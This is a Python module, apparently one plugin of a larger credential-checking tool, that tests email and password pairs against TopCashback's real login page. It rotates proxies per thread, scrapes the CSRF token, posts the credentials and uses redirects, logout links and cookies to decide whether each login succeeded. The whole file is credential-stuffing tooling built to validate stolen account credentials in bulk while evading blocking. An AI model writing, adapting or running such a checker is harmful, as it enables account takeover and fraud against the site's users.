"""
Checker for TopCashback (www.topcashback.com)
Handles CSRF token, redirects, and proxy rotation.
"""
import re
import requests
import threading
from typing import Tuple

BASE_URL = "https://www.topcashback.com/"
LOGIN_PAGE = BASE_URL + "logon/?RedirectURL=%2Fhome%2F"
LOGIN_POST = BASE_URL + "logon/"   # likely the POST endpoint
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_PAGE
    })

    try:
        # Step 1: GET login page to extract CSRF token
        get_resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
        if get_resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {get_resp.status_code})"

        # Look for common CSRF token names
        token_patterns = [
            r'<input.*?name="__RequestVerificationToken".*?value="([^"]+)"',
            r'<input.*?name="csrfToken".*?value="([^"]+)"',
            r'<input.*?name="authenticity_token".*?value="([^"]+)"',
            r'<input.*?name="csrf".*?value="([^"]+)"',
            r'<meta.*?name="csrf-token".*?content="([^"]+)"',
        ]
        csrf_token = None
        for pattern in token_patterns:
            match = re.search(pattern, get_resp.text, re.IGNORECASE)
            if match:
                csrf_token = match.group(1)
                break

        # Step 2: Prepare payload
        payload = {
            "Email": email,
            "Password": password,
            "RedirectURL": "/home/"
        }
        if csrf_token:
            # Add the token with the correct field name – we need to detect the actual name
            # Try to find the field name from the page
            field_match = re.search(r'<input.*?name="([^"]+)".*?value="' + re.escape(csrf_token) + '"', get_resp.text, re.IGNORECASE)
            if field_match:
                token_field_name = field_match.group(1)
                payload[token_field_name] = csrf_token
            else:
                # If we can't find the field name, try common ones
                for common_name in ["__RequestVerificationToken", "csrfToken", "authenticity_token", "csrf"]:
                    if common_name in get_resp.text:
                        payload[common_name] = csrf_token
                        break

        # Step 3: POST credentials
        post_resp = session.post(LOGIN_POST, data=payload, timeout=TIMEOUT, allow_redirects=True)

        # Step 4: Determine success
        final_url = post_resp.url.lower()
        # Check if we are redirected away from login
        if "logon" not in final_url and "login" not in final_url:
            return True, f"Login successful (redirected to {post_resp.url})"

        # Check for success indicators in HTML
        html = post_resp.text.lower()
        if "log out" in html or "logout" in html or "sign out" in html:
            return True, "Login successful (logout link found)"

        if "welcome" in html or "my account" in html:
            return True, "Login successful (content marker)"

        # Check for error messages
        error_phrases = ["invalid", "incorrect", "error", "failed", "wrong", "not found"]
        if any(phrase in html for phrase in error_phrases):
            # Try to extract the error message
            error_match = re.search(r'<div class="alert alert-danger">(.*?)</div>', post_resp.text, re.IGNORECASE | re.DOTALL)
            if error_match:
                return False, f"Login failed: {error_match.group(1).strip()}"
            return False, "Login failed (error message found)"

        # If we still have a login form, likely a failure
        if 'name="password"' in html or 'type="password"' in html:
            return False, "Login failed (login form still present)"

        # Fallback – if we have a session cookie, treat as success
        if session.cookies.get_dict():
            return True, "Login successful (session cookie set)"

        # Otherwise ambiguous
        return False, "Login response ambiguous (treated as failure)"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"